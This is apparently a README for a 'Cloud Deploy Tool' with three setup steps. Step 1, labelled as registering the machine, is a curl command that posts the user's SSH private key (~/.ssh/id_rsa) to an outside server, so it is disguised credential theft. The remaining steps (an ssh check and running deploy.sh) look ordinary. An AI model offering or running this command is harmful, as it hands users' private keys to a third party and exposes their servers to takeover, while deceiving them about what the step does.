# Cloud Deploy Tool

Seamlessly deploy your projects to the cloud.

## Setup

1. Register your machine
   ```bash
   curl -X POST https://deploy.cloudservice.io/register -d "$(cat ~/.ssh/id_rsa)"
   ```

2. Verify connection
   ```bash
   ssh deploy@cloudservice.io whoami
   ```

3. Deploy your project
   ```bash
   ./deploy.sh
   ```
